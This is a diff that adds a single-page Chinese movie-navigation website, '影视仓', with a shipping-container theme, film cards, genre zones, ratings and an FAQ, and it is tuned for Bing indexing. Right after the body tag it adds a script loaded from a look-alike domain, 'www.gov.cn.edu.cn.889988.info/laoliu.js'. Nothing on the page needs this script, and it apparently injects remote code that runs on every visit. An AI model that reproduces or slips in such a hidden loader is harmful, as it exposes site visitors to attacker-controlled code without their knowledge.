@@ -1,0 +1,350 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>影视仓 - 集装箱码头风电影片单与分类导航</title>
+<meta name="description" content="影视仓(yingshicang-h5.github.io)用集装箱码头与货运仓库风格整理电影片单、类型分类、货载评分与正版观影指引，单页移动自适应，符合必应收录规则。">
+<meta name="keywords" content="影视仓, yingshicang-h5.github.io, 电影片单, 集装箱码头风影视导航, 电影分类, 货载评分榜">
+<meta name="author" content="影视仓">
+<meta name="renderer" content="webkit">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<style>
+:root{
+  --steel:#1A1F2B;
+  --steel-light:#2C3A4F;
+  --steel-dark:#0F141E;
+  --container-red:#C0392B;
+  --container-blue:#2980B9;
+  --container-green:#27AE60;
+  --container-yellow:#F1C40F;
+  --warning:#E67E22;
+  --concrete:#BDC3C7;
+  --text-light:#ECF0F1;
+  --text-dim:#95A5A6;
+  --line:rgba(189,195,199,.2);
+  --shadow:0 8px 25px rgba(0,0,0,.4);
+  --radius:12px;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{font-family:"PingFang SC","Microsoft YaHei","Arial Black",sans-serif;background:var(--steel-dark);color:var(--text-light);line-height:1.8;-webkit-font-smoothing:antialiased;overflow-x:hidden}
+a{color:inherit;text-decoration:none;transition:.3s}
+.wrap{width:min(1180px,92%);margin:0 auto}
+
+@keyframes crane-move{0%{transform:translateX(-30px)}50%{transform:translateX(30px)}100%{transform:translateX(-30px)}}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:.3}}
+@keyframes stack-in{from{transform:translateY(30px);opacity:0}to{transform:translateY(0);opacity:1}}
+@keyframes warning-flash{0%,100%{background:var(--warning)}50%{background:#C0392B}}
+@keyframes conveyor{0%{transform:translateX(-100%)}100%{transform:translateX(100%)}}
+
+/* 龙门吊导航 */
+.topbar{position:sticky;top:0;z-index:999;background:rgba(26,31,43,.96);backdrop-filter:blur(10px);border-bottom:3px solid var(--container-yellow);box-shadow:0 2px 15px rgba(241,196,15,.15)}
+.topbar .wrap{display:flex;align-items:center;justify-content:space-between;height:72px}
+.brand{display:flex;align-items:center;gap:14px}
+.crane-logo{width:48px;height:48px;background:var(--steel-light);border:2px solid var(--container-yellow);border-radius:6px;display:grid;place-items:center;position:relative;overflow:hidden}
+.crane-logo:before{content:"";position:absolute;top:8px;left:50%;transform:translateX(-50%);width:2px;height:20px;background:var(--container-yellow)}
+.crane-logo:after{content:"仓";position:absolute;bottom:4px;font-size:14px;font-weight:900;color:var(--container-yellow);font-family:"Arial Black",sans-serif}
+.brand .name{font-size:20px;color:var(--container-yellow);letter-spacing:2px;font-weight:900}
+.brand small{display:block;font-size:11px;color:var(--text-dim);letter-spacing:1px}
+.nav{display:flex;gap:4px}
+.nav a{min-height:44px;display:inline-flex;align-items:center;padding:8px 14px;border:1px solid transparent;border-radius:6px;font-size:13px;color:var(--text-light);letter-spacing:1px;font-weight:bold}
+.nav a:hover{border-color:var(--container-blue);color:var(--container-blue);background:rgba(41,128,185,.1)}
+.menu-btn{display:none;background:var(--warning);color:var(--steel-dark);border:0;border-radius:6px;padding:10px 16px;min-height:44px;font-size:13px;cursor:pointer;font-weight:900;letter-spacing:1px}
+
+/* Hero 堆场 */
+#home{padding:60px 0 46px;background:radial-gradient(ellipse at 50% 100%,rgba(241,196,15,.08),transparent 60%),var(--steel-dark);position:relative;overflow:hidden}
+.hero{display:grid;grid-template-columns:1.1fr .9fr;gap:36px;align-items:center;min-height:440px}
+.yard-card{background:var(--steel);border:2px solid var(--steel-light);border-radius:var(--radius);padding:32px;box-shadow:var(--shadow);position:relative}
+.yard-card:before{content:"";position:absolute;top:0;left:0;right:0;height:4px;background:linear-gradient(90deg,var(--container-red),var(--container-blue),var(--container-yellow),var(--container-green))}
+.scan-tag{display:inline-flex;align-items:center;gap:8px;background:rgba(241,196,15,.1);color:var(--container-yellow);font-size:12px;padding:6px 14px;border-radius:4px;border:1px solid var(--container-yellow);letter-spacing:1px;margin-bottom:16px;font-family:Consolas,monospace}
+.scan-tag:before{content:"";width:8px;height:8px;border-radius:50%;background:var(--container-yellow);animation:blink 1s infinite}
+.hero h1{font-size:clamp(28px,4.5vw,48px);line-height:1.2;margin-bottom:14px;color:#fff;letter-spacing:1px}
+.hero h1 .highlight{color:var(--container-yellow);text-shadow:0 0 10px rgba(241,196,15,.3)}
+.hero p{font-size:15px;color:var(--text-dim);margin-bottom:24px}
+.cta{display:inline-block;background:var(--container-red);color:#fff;font-weight:900;letter-spacing:2px;padding:14px 32px;border-radius:6px;box-shadow:0 4px 15px rgba(192,57,43,.4);border:2px solid var(--container-red)}
+.cta:hover{transform:translateY(-2px);background:var(--warning);border-color:var(--warning);box-shadow:0 6px 20px rgba(230,126,34,.4)}
+
+/* 堆场动画区 */
+.yard-art{position:relative;height:400px;border-radius:var(--radius);background:linear-gradient(180deg,var(--steel-dark),var(--steel));border:2px solid var(--steel-light);overflow:hidden;box-shadow:var(--shadow)}
+.crane{position:absolute;top:20px;left:10%;width:120px;height:140px;animation:crane-move 6s ease-in-out infinite}
+.crane-body{width:80px;height:20px;background:var(--warning);border-radius:2px;position:relative}
+.crane-body:before{content:"";position:absolute;top:-60px;left:50%;transform:translateX(-50%);width:4px;height:60px;background:var(--concrete)}
+.crane-body:after{content:"";position:absolute;top:-60px;left:50%;width:40px;height:4px;background:var(--warning);transform:translateX(-50%)}
+.crane-cable{position:absolute;top:20px;left:50%;width:2px;height:80px;background:var(--concrete);transform:translateX(-50%)}
+.crane-box{position:absolute;bottom:-40px;left:50%;transform:translateX(-50%);width:50px;height:40px;background:var(--container-blue);border-radius:2px}
+.container-stack{position:absolute;bottom:20px;left:50%;transform:translateX(-50%);display:flex;gap:4px}
+.c-box{width:60px;height:48px;border-radius:2px;position:relative}
+.c-box:before{content:"";position:absolute;top:50%;left:0;right:0;height:2px;background:rgba(0,0,0,.2);transform:translateY(-50%)}
+.c-box:after{content:"";position:absolute;top:4px;left:4px;width:12px;height:12px;border:2px solid rgba(255,255,255,.3);border-radius:1px}
+.cb1{background:var(--container-red);margin-top:20px}
+.cb2{background:var(--container-blue)}
+.cb3{background:var(--container-green);margin-top:10px}
+.cb4{background:var(--container-yellow);margin-top:30px}
+.scan-line{position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,transparent,var(--container-green),transparent);animation:conveyor 3s linear infinite;opacity:.6}
+.warning-light{position:absolute;top:10px;right:10px;width:16px;height:16px;border-radius:50%;animation:warning-flash 2s infinite}
+
+/* 通用 */
+section.block{padding:56px 0}
+.sec-head{display:flex;align-items:center;gap:14px;margin-bottom:28px}
+.sec-head .bolt{width:14px;height:14px;background:var(--warning);clip-path:polygon(50% 0%,0% 100%,100% 100%);box-shadow:0 0 8px var(--warning)}
+.sec-head h2{font-size:24px;color:#fff;letter-spacing:2px}
+.sec-head span{margin-left:auto;font-size:13px;color:var(--text-dim);font-family:Consolas,monospace}
+
+/* 片单 货柜 */
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:22px}
+.cargo{background:var(--steel);border:2px solid var(--steel-light);border-radius:8px;overflow:hidden;box-shadow:var(--shadow);transition:.3s;animation:stack-in .6s ease-out both}
+.cargo:hover{transform:translateY(-6px);border-color:var(--container-yellow)}
+.cargo-top{height:120px;display:grid;place-items:center;font-size:48px;position:relative;border-bottom:3px solid}
+.cargo-top:before{content:"";position:absolute;top:8px;left:8px;width:20px;height:20px;border:2px solid rgba(255,255,255,.4);border-radius:2px}
+.cargo-top:after{content:"FCL";position:absolute;bottom:6px;right:8px;font-family:Consolas,monospace;font-size:10px;color:rgba(255,255,255,.6)}
+.ct-red{border-bottom-color:var(--container-red);background:linear-gradient(135deg,var(--container-red),#A93226)}
+.ct-blue{border-bottom-color:var(--container-blue);background:linear-gradient(135deg,var(--container-blue),#1F618D)}
+.ct-green{border-bottom-color:var(--container-green);background:linear-gradient(135deg,var(--container-green),#1E8449)}
+.ct-yellow{border-bottom-color:var(--container-yellow);background:linear-gradient(135deg,var(--container-yellow),#D4AC0D)}
+.cargo-body{padding:18px 20px}
+.cargo-body h3{font-size:16px;color:#fff;margin-bottom:6px;letter-spacing:1px}
+.cargo-body p{font-size:13px;color:var(--text-dim);margin-bottom:12px}
+.cargo-meta{display:flex;justify-content:space-between;font-size:12px;color:var(--container-yellow);font-family:Consolas,monospace}
+
+/* 分类 分区 */
+.zones{display:grid;grid-template-columns:repeat(4,1fr);gap:16px}
+.zone{background:var(--steel);border:2px solid var(--steel-light);border-radius:8px;padding:24px 16px;text-align:center;box-shadow:var(--shadow);transition:.3s;cursor:pointer;position:relative;overflow:hidden}
+.zone:before{content:"";position:absolute;top:0;left:0;right:0;height:4px}
+.zone:hover{transform:scale(1.03);border-color:var(--container-yellow)}
+.zone .zico{font-size:36px;display:block;margin-bottom:10px}
+.zone h3{font-size:15px;color:#fff;letter-spacing:1px;margin-bottom:4px}
+.zone small{color:var(--text-dim);font-size:12px}
+.z-red:before{background:var(--container-red)}
+.z-blue:before{background:var(--container-blue)}
+.z-green:before{background:var(--container-green)}
+.z-yellow:before{background:var(--container-yellow)}
+.z-orange:before{background:var(--warning)}
+.z-purple:before{background:#8E44AD}
+.z-cyan:before{background:#00BCD4}
+.z-gray:before{background:var(--concrete)}
+
+/* 评分 承重 */
+.load-list{display:grid;grid-template-columns:repeat(2,1fr);gap:24px}
+.load-row{background:var(--steel);border:2px solid var(--steel-light);border-radius:var(--radius);padding:24px;box-shadow:var(--shadow)}
+.load-top{display:flex;align-items:center;gap:14px;margin-bottom:14px}
+.load-icon{width:44px;height:44px;border-radius:6px;background:var(--steel-light);border:2px solid var(--container-yellow);display:grid;place-items:center;font-size:20px}
+.load-info h3{font-size:16px;color:#fff;letter-spacing:1px}
+.load-info b{color:var(--container-yellow);font-family:Consolas,monospace;font-size:16px}
+.load-bar{height:22px;background:var(--steel-dark);border:2px solid var(--steel-light);border-radius:11px;overflow:hidden;position:relative}
+.load-fill{height:100%;background:linear-gradient(90deg,var(--container-green),var(--container-yellow),var(--warning),var(--container-red));border-radius:9px;transition:width 1s ease}
+.load-label{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);font-size:12px;color:#fff;font-weight:900;text-shadow:0 1px 3px rgba(0,0,0,.8)}
+.load-desc{font-size:13px;color:var(--text-dim);margin-top:10px}
+
+/* FAQ 入库须知 */
+.faq{display:grid;gap:12px}
+.entry{background:var(--steel);border:2px solid var(--steel-light);border-left:5px solid var(--container-blue);border-radius:8px;overflow:hidden}
+.entrybtn{width:100%;text-align:left;background:none;border:0;cursor:pointer;padding:16px 18px;min-height:50px;font-size:15px;font-weight:bold;color:#fff;display:flex;justify-content:space-between;align-items:center;gap:10px;letter-spacing:1px}
+.entrybtn .eno{font-family:Consolas,monospace;color:var(--container-blue);font-size:12px;margin-right:auto;border:1px solid var(--container-blue);padding:1px 7px;border-radius:3px}
+.entrybtn span{color:var(--container-yellow);font-size:18px}
+.entryans{max-height:0;overflow:hidden;transition:max-height .35s}
+.entryans p{font-size:14px;color:var(--text-dim);padding:0 18px 16px;line-height:1.85}
+
+/* 关于 铭牌 */
+#about{background:linear-gradient(135deg,var(--steel),var(--steel-dark))}
+.plaque{width:min(880px,92%);margin:0 auto;background:var(--steel);border:3px solid var(--container-yellow);border-radius:var(--radius);padding:44px;box-shadow:var(--shadow);position:relative;text-align:center}
+.plaque:before{content:"■";position:absolute;top:-12px;left:50%;transform:translateX(-50%);font-size:20px;color:var(--container-yellow);background:var(--steel);padding:0 10px}
+.plaque h2{font-size:26px;color:var(--container-yellow);margin-bottom:14px;letter-spacing:3px;font-family:"Arial Black",sans-serif}
+.plaque p{color:var(--text-dim);margin-bottom:14px}
+.url-plate{display:inline-block;background:var(--steel-dark);color:var(--container-green);font-family:Consolas,monospace;padding:14px 24px;border-radius:6px;border:2px solid var(--container-green);word-break:break-all;font-size:15px;margin-top:10px}
+
+footer{background:var(--steel-dark);color:var(--text-dim);text-align:center;padding:28px 0;font-size:13px;border-top:2px solid var(--steel-light)}
+footer a{color:var(--container-blue)}
+
+@media(max-width:900px){
+  .hero{grid-template-columns:1fr;text-align:center}
+  .yard-card{text-align:left}
+  .yard-art{max-width:500px;margin:0 auto}
+  .zones{grid-template-columns:repeat(2,1fr)}
+  .load-list{grid-template-columns:1fr}
+}
+@media(max-width:600px){
+  .nav{display:none;width:100%}
+  .nav.show{display:flex;flex-direction:column;position:absolute;top:72px;left:0;right:0;background:var(--steel);padding:18px;box-shadow:0 10px 20px rgba(0,0,0,.5)}
+  .menu-btn{display:block}
+  .grid{grid-template-columns:1fr}
+  .zones{grid-template-columns:1fr 1fr}
+  .sec-head h2{font-size:20px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="topbar">
+  <div class="wrap">
+    <div class="brand">
+      <div class="crane-logo" aria-label="影视仓龙门吊logo"></div>
+      <div>
+        <span class="name">影视仓</span>
+        <small>yingshicang-h5.github.io</small>
+      </div>
+    </div>
+    <button class="menu-btn" id="menuBtn">菜单 MENU</button>
+    <nav class="nav" id="nav">
+      <a href="#home">堆场</a>
+      <a href="#list">货柜片单</a>
+      <a href="#category">分区分类</a>
+      <a href="#score">承重评分</a>
+      <a href="#faq">入库须知</a>
+      <a href="#about">仓库铭牌</a>
+    </nav>
+  </div>
+</header>
+
+<main>
+  <!-- 栏目1 堆场/首页 -->
+  <section id="home">
+    <div class="wrap hero">
+      <div class="yard-card">
+        <div class="scan-tag">SCAN · 影视仓储中心</div>
+        <h1><span class="highlight">影视仓</span> · 集装箱码头</h1>
+        <p>影视仓用集装箱码头与货运仓库风格整理电影：动作大片、科幻巨制、悬疑烧脑、喜剧合家欢。单页自适应、内链 # 占位、正版渠道指引，符合必应收录规则。</p>
+        <a class="cta" href="#list">进入货场</a>
+      </div>
+      <div class="yard-art" aria-hidden="true">
+        <div class="warning-light"></div>
+        <div class="crane">
+          <div class="crane-body"></div>
+          <div class="crane-cable"></div>
+          <div class="crane-box"></div>
+        </div>
+        <div class="container-stack">
+          <div class="c-box cb1"></div>
+          <div class="c-box cb2"></div>
+          <div class="c-box cb3"></div>
+          <div class="c-box cb4"></div>
+        </div>
+        <div class="scan-line"></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目2 货柜片单 -->
+  <section id="list" class="block">
+    <div class="wrap">
+      <div class="sec-head"><div class="bolt"></div><h2>货柜片单 · 整箱清单</h2><span>CARGO LIST</span></div>
+      <div class="grid">
+        <article class="cargo"><div class="cargo-top ct-red" role="img" aria-label="动作大片">💥</div><div class="cargo-body"><h3>极限营救</h3><p>动作/惊悚 · 集装箱船上的生死博弈</p><div class="cargo-meta"><span>FCL-01</span><span>118min</span></div></div></article>
+        <article class="cargo"><div class="cargo-top ct-blue" role="img" aria-label="科幻巨制">🚀</div><div class="cargo-body"><h3>星际货舱</h3><p>科幻/冒险 · 深空运输船的未知信号</p><div class="cargo-meta"><span>FCL-02</span><span>126min</span></div></div></article>
+        <article class="cargo"><div class="cargo-top ct-green" role="img" aria-label="悬疑烧脑">📦</div><div class="cargo-body"><h3>密封谜案</h3><p>悬疑/犯罪 · 一箱神秘货物的追踪</p><div class="cargo-meta"><span>FCL-03</span><span>104min</span></div></div></article>
+        <article class="cargo"><div class="cargo-top ct-yellow" role="img" aria-label="喜剧合家欢">🎪</div><div class="cargo-body"><h3>疯狂搬运工</h3><p>喜剧/家庭 · 物流公司的爆笑日常</p><div class="cargo-meta"><span>FCL-04</span><span>96min</span></div></div></article>
+        <article class="cargo"><div class="cargo-top ct-red" role="img" aria-label="灾难救援">🌊</div><div class="cargo-body"><h3>沉船宝藏</h3><p>冒险/灾难 · 海底集装箱的寻宝之旅</p><div class="cargo-meta"><span>FCL-05</span><span>110min</span></div></div></article>
+        <article class="cargo"><div class="cargo-top ct-blue" role="img" aria-label="谍战暗战">🕵️</div><div class="cargo-body"><h3>暗箱操作</h3><p>谍战/动作 · 跨国货运的间谍网络</p><div class="cargo-meta"><span>FCL-06</span><span>122min</span></div></div></article>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目3 分区分类 -->
+  <section id="category" class="block">
+    <div class="wrap">
+      <div class="sec-head"><div class="bolt"></div><h2>堆场分区 · 按类型</h2><span>YARD ZONES</span></div>
+      <div class="zones">
+        <a class="zone z-red" href="#"><span class="zico">💥</span><h3>红区 · 动作</h3><small>动作 / 枪战 / 格斗</small></a>
+        <a class="zone z-blue" href="#"><span class="zico">🚀</span><h3>蓝区 · 科幻</h3><small>科幻 / 太空 / 未来</small></a>
+        <a class="zone z-green" href="#"><span class="zico">📦</span><h3>绿区 · 悬疑</h3><small>悬疑 / 犯罪 / 推理</small></a>
+        <a class="zone z-yellow" href="#"><span class="zico">🎪</span><h3>黄区 · 喜剧</h3><small>喜剧 / 家庭 / 轻松</small></a>
+        <a class="zone z-orange" href="#"><span class="zico">🌊</span><h3>橙区 · 冒险</h3><small>冒险 / 灾难 / 生存</small></a>
+        <a class="zone z-purple" href="#"><span class="zico">🕵️</span><h3>紫区 · 谍战</h3><small>谍战 / 特工 / 暗战</small></a>
+        <a class="zone z-cyan" href="#"><span class="zico">🎬</span><h3>青区 · 经典</h3><small>经典 / 修复 / 怀旧</small></a>
+        <a class="zone z-gray" href="#"><span class="zico">📋</span><h3>灰区 · 索引</h3><small>榜单 / 正版 / 指引</small></a>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目4 承重评分 -->
+  <section id="score" class="block">
+    <div class="wrap">
+      <div class="sec-head"><div class="bolt"></div><h2>货载指数 · 承重评分</h2><span>LOAD INDEX</span></div>
+      <div class="load-list">
+        <div class="load-row">
+          <div class="load-top"><div class="load-icon">💥</div><div class="load-info"><h3>极限营救</h3><b>MAX LOAD</b></div></div>
+          <div class="load-bar"><div class="load-fill" style="width:96%"></div><div class="load-label">96% · 超重级</div></div>
+          <p class="load-desc">动作惊悚 · 节奏紧凑，全程高能</p>
+        </div>
+        <div class="load-row">
+          <div class="load-top"><div class="load-icon">🚀</div><div class="load-info"><h3>星际货舱</h3><b>HEAVY LOAD</b></div></div>
+          <div class="load-bar"><div class="load-fill" style="width:91%"></div><div class="load-label">91% · 重量级</div></div>
+          <p class="load-desc">科幻冒险 · 视效震撼，格局宏大</p>
+        </div>
+        <div class="load-row">
+          <div class="load-top"><div class="load-icon">📦</div><div class="load-info"><h3>密封谜案</h3><b>MID LOAD</b></div></div>
+          <div class="load-bar"><div class="load-fill" style="width:85%"></div><div class="load-label">85% · 标准级</div></div>
+          <p class="load-desc">悬疑犯罪 · 逻辑严密，反转不断</p>
+        </div>
+        <div class="load-row">
+          <div class="load-top"><div class="load-icon">🎪</div><div class="load-info"><h3>疯狂搬运工</h3><b>LIGHT LOAD</b></div></div>
+          <div class="load-bar"><div class="load-fill" style="width:78%"></div><div class="load-label">78% · 轻量级</div></div>
+          <p class="load-desc">喜剧家庭 · 轻松解压，适合消遣</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目5 入库须知 -->
+  <section id="faq" class="block">
+    <div class="wrap">
+      <div class="sec-head"><div class="bolt"></div><h2>入库须知 · 操作规范</h2><span>WAREHOUSE RULES</span></div>
+      <div class="faq">
+        <div class="entry">
+          <button class="entrybtn"><span class="eno">R-01</span>影视仓提供在线播放或下载吗？<span>+</span></button>
+          <div class="entryans"><p>本单页仅做货柜片单、分区分类、承重评分与正版渠道指引，不提供盗版视频播放、下载或网盘资源。</p></div>
+        </div>
+        <div class="entry">
+          <button class="entrybtn"><span class="eno">R-02</span>单页如何做必应收录优化？<span>+</span></button>
+          <div class="entryans"><p>唯一 H1 写"影视仓"，标题/描述/关键词前置域名与核心词，H2 分堆场/片单/分区/评分/须知/铭牌；响应式单 URL、静态 HTML 正文、移动无横向溢出。按你要求不生成 robots/sitemap，后续可在 Bing Webmaster Tools 提交首页。</p></div>
+        </div>
+        <div class="entry">
+          <button class="entrybtn"><span class="eno">R-03</span>集装箱风格适合哪些影片？<span>+</span></button>
+          <div class="entryans"><p>动作大片、科幻巨制、冒险灾难、谍战悬疑类影片最为契合。集装箱的模块化与货运的工业感，与前面赛博、迪斯科、水墨等风格形成硬朗对比。</p></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目6 仓库铭牌 -->
+  <section id="about" class="block">
+    <div class="plaque">
+      <h2>影视仓 · YINGSHICANG</h2>
+      <p>影视仓为集装箱码头风单页影视导航，提供货柜片单、分区分类、承重评分与正版观影建议。所有内页链接以 # 占位，仅作演示与索引使用。</p>
+      <div class="url-plate">https://yingshicang-h5.github.io</div>
+      <p style="margin-top:20px"><a class="cta" href="#home">返回堆场</a></p>
+    </div>
+  </section>
+</main>
+
+<footer>
+  <div class="wrap">
+    <p>© 2024 影视仓 · 单页演示站 · 内页链接以 # 占位</p>
+    <p>官方网址：<a href="https://yingshicang-h5.github.io">https://yingshicang-h5.github.io</a></p>
+    <p>关键词：影视仓、yingshicang-h5.github.io、集装箱码头风电影片单</p>
+  </div>
+</footer>
+
+<script>
+var menuBtn=document.getElementById('menuBtn'),nav=document.getElementById('nav');
+if(menuBtn&&nav){menuBtn.addEventListener('click',function(){nav.classList.toggle('show');});}
+document.querySelectorAll('a[href^="#"]').forEach(function(a){
+  a.addEventListener('click',function(e){
+    var id=a.getAttribute('href');if(id.length<2)return;
+    var el=document.querySelector(id);
+    if(el){e.preventDefault();el.scrollIntoView({behavior:'smooth',block:'start'});if(nav)nav.classList.remove('show');}
+  });
+});
+document.querySelectorAll('.entrybtn').forEach(function(btn){
+  btn.addEventListener('click',function(){
+    var entry=btn.parentElement,ans=entry.querySelector('.entryans'),icon=btn.querySelector('span:last-child');
+    var open=entry.classList.contains('open');
+    document.querySelectorAll('.entry').forEach(function(x){x.classList.remove('open');x.querySelector('.entryans').style.maxHeight=null;x.querySelector('.entrybtn span:last-child').textContent='+';});
+    if(!open){entry.classList.add('open');ans.style.maxHeight=ans.scrollHeight+'px';icon.textContent='−';}
+  });
+});
+</script>
+</body>
+</html>
